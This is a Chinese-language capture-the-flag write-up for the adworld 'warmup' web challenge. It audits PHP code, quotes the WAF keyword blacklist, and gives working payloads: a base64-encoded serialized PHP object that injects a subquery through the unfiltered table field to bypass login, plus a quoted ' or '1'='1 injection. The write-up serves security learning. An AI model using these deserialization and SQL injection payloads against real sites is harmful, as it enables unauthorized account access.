# WARMUP-adworld

![image-20240909191220820](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240909191220820.png)

首先代码审计发现对于cookie有很多信息，尤其是在index.php直接有判断

![image-20240909191507009](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240909191507009.png)

那我们首先抓一下包

![image-20240906212200548](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240906212200548.png)

可以看到cookie直接有泄露，对last_login_info直接base64解密得到，这意思是cookie中记录了地址

```
a:1:{s:2:"ip";s:12:"112.48.20.87";}
```



首先审计代码，在传入user和passwd时候已经使用**addslashes**函数过滤了

![image-20240909191538435](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240909191538435.png)

- 单引号（'）
- 双引号（"）
- 反斜杠（\）
- NULL

四种符号，之后会通过waf的

```
$blacklist = ["union", "join", "!", "\"", "#", "$", "%", "&", ".", "/", ":", ";", "^", "_", "`", "{", "|", "}", "<", ">", "?", "@", "[", "\\", "]" , "*", "+", "-"];
```

的筛选。理论上这次sql注入确实难度不小。

首先不提addslashes函数是可以绕过的，可以发现在table中是没有使用addslashes函数过滤的、

那么这里就存在对table的sql注入

并且给出了完整的php文件，为我们本地测试反序列化提供条件

我们要做的就是，在这一个sql查询中添加我们的反序列化语言

```php
public function **query**() {

​    $this->**waf**();

​    return $this->conn->**query** ("select username,password from ".$this->table." where username='".$this->username."' and password='".$this->password."'");

  }
```

首先通过本地部署创建类进行反序列化得到结果

```
O:3:"SQL":4:{s:5:"table";s:0:"";s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"conn";N;}
```

我们可以在table处进行注入，并且这里涉及到sql语法（也是看wp学到的，对sql语法还不是很熟练

对于这么一个sql语句的构造，临时表创建后就会使得where语句查询正确并且查询结果也正确

```sql
SELECT username, password 
FROM (SELECT 'admin' AS username, '123' AS password) AS subquery 
WHERE username = 'admin' AND password = '123';

```

所以构造反序列化并且base64加密

```
O:3:"SQL":4:{s:5:"table";s:54:"(SELECT 'admin' AS username, '123' AS password) AS tll";s:8:"username";s:5:"admin";s:8:"password";s:3:"123";s:4:"conn";N;}}
```



```
TzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NTQ6IihTRUxFQ1QgJ2FkbWluJyBBUyB1c2VybmFtZSwgJzEyMycgQVMgcGFzc3dvcmQpIEFTIHRsbCI7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo4OiJwYXNzd29yZCI7czozOiIxMjMiO3M6NDoiY29ubiI7Tjt9fQ==
```

不过看wp中，设计到passwd也有or 1=1的布尔注入，

```
O:3:"SQL":5:{s:5:"table";s:5:"users";s:8:"username";s:5:"admin";s:8:"password";s:11:"' or '1'='1";s:4:"conn";N;s:10:"SQL_wakeup";N;}
```

但是我认为waf中应该过滤了才对，但他却成功注入，感觉其中有研究